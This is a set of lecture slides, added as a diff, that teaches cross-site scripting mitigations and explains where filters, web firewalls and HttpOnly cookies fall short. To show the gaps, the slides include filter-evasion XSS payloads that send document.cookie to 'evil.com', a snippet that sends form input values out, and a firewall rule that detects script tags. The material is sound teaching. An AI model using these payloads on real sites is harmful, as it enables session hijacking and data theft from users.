@@ -1,0 +1,109 @@
+
+# XSS mitigations {visibility="hidden"}
+
+### webapp XSS mitigations  {.smaller}
+
+
+* host dangerous stuff on different domain 
+
+   * has different cookies
+
+* [filter/escape inputs]{.fragment fragment-index=2 .custom .myem-only} (same as normal command injection) 
+
+   * some libraries to help --- very easy to get this wrong
+
+* [web application firewalls]{.fragment fragment-index=3 .custom .myem-only} 
+
+   * module on web server that look for ‘bad-looking’ requests
+
+* Content-Security-Policy 
+
+   * server says ‘‘browser, don't run scripts here’’
+
+* [HttpOnly cookies]{.fragment fragment-index=4 .custom .myem-only}  
+
+   * server says ‘‘browser, don't share this with code on the page’’
+
+
+
+### HTML filtering/escaping nits  {.smaller}
+
+
+
+* it's easy to mess up HTML filtering or escaping 
+
+   * (especially if trying to allow ‘‘safe HTML’’)
+   * browsers have features you don't know about
+
+* can ‘only’ set image URL? 
+```html
+<img src="javascript:(new Image()).src=
+                     'http://evil.com/' + document.cookie">
+
+```
+
+* disallow the word ‘script’? 
+```html
+<img src="x"onerror="(new Image()).src=
+                   'http://evil.com/' + document.cookie">
+
+```
+
+ [via [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)]{.mycredit}
+
+### againframe(XSSmits)
+
+### web application firewall rule  {.smaller}
+
+
+```
+# via coreruleset.org, simplified some
+SecRule REQUEST_COOKIES|...|REQUEST_FILENAME|\
+        ARGS_NAMES|ARGS|... \
+    "@rx (?i)<script[^>]*>[\s\S]*?" \
+    "id:941140,phase:2,block,cpature..."
+
+```
+ 
+
+* look for `<script>` tags in request
+* problem: maybe not use
+
+
+### againframe(XSSmits)
+
+### HTTP-only cookies  {.smaller}
+
+
+
+* <code>Set-Cookie: SessionID=123456789; HttpOnly</code>
+* ‘‘only send cookie in HTTP’’
+* cookie is <em>not available to JS</em>
+* eliminates obvious way of exploiting XSS
+* problem (1): [JS can read webpage contents]{.fragment fragment-index=2 .custom .myem-only}
+ 
+```
+(new Image()).src = "https://example.com/?" +
+    document.getElementByTagName('input')[0].value
+
+```
+
+
+### HTTP-only cookies  {.smaller}
+
+
+
+* problem (2): [JS can automate webpages on same origin]{.fragment fragment-index=2 .custom .myem-only}
+ 
+```
+<iframe id='the-frame'></iframe>
+<script>
+var frame = document.getElementById('the-frame');
+frame.onload = function( {
+    frame.contentDocument.getElementById('form-field').value = ...;
+    frame.contentDocument.getElementById('form-id').submit()
+}
+frame.src = ...;
+
+```
+
